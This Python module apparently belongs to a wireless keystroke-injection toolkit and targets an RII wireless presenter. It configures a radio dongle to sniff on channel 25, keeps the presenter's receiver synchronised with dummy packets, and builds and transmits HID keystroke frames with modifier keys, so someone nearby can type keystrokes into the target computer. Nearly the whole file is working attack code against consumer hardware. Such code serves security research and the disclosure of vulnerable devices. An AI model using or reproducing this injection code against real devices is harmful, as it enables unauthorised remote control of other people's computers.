from protocol import Protocol
from lib import common
from collections import deque
from threading import Thread
import time
import logging
import crcmod
import struct


# RII rounded-pen wireless presenter
class RII(Protocol):

  # Constructor
  def __init__(self, address):

    self.address = address

    super(RII, self).__init__("RII")


  # Configure the radio
  def configure_radio(self):

    # Put the radio in sniffer mode
    common.radio.enter_sniffer_mode(self.address, rate=common.RF_RATE_250K)

    # Set the channels to [25]
    common.channels = [25]

    # Set the initial channel
    common.radio.set_channel(common.channels[0])

    # Initial sequence number
    self.seq = 0


  # Enter injection mode
  def start_injection(self):

    # Build a dummy HID payload
    self.seq = 0
    self.dummy_pld = "00:00:00"

    # Start the TX loop
    self.cancel_tx_loop = False
    self.tx_queue = deque()
    self.tx_thread = Thread(target=self.tx_loop)
    self.tx_thread.daemon = True
    self.tx_thread.start()

    # Queue up 50 dummy packets for initial dongle sync
    for x in range(50):
      self.tx_queue.append(self.dummy_pld)


  # TX loop
  def tx_loop(self):

    while not self.cancel_tx_loop:

      # Read from the queue
      if len(self.tx_queue):

        # Transmit the queued packet a couple times
        payload = self.tx_queue.popleft()
        for x in range(2):
          ack_timeout = 1 # 500ms
          retries = 4
          common.radio.transmit_payload(payload, ack_timeout, retries)
      
      # No queue items; transmit a dummy packet
      else:
        self.tx_queue.append(self.dummy_pld)


  # Leave injection mode
  def stop_injection(self):
    while len(self.tx_queue):
      time.sleep(0.001)
      continue
    self.cancel_tx_loop = True
    self.tx_thread.join()


  # Send a HID event
  def send_hid_event(self, scan_code=0, shift=False, ctrl=False, win=False):

    # Keystroke modifiers
    modifiers = 0x00
    if shift: modifiers |= 0x20
    if ctrl: modifiers |= 0x01
    if win: modifiers |= 0x08

    # Build and queue
    payload = ("4%x:%02x:%02x" % (self.seq&0x0f, scan_code, modifiers)).replace(":", "").decode("hex")
    self.tx_queue.append(payload)
    self.seq += 1
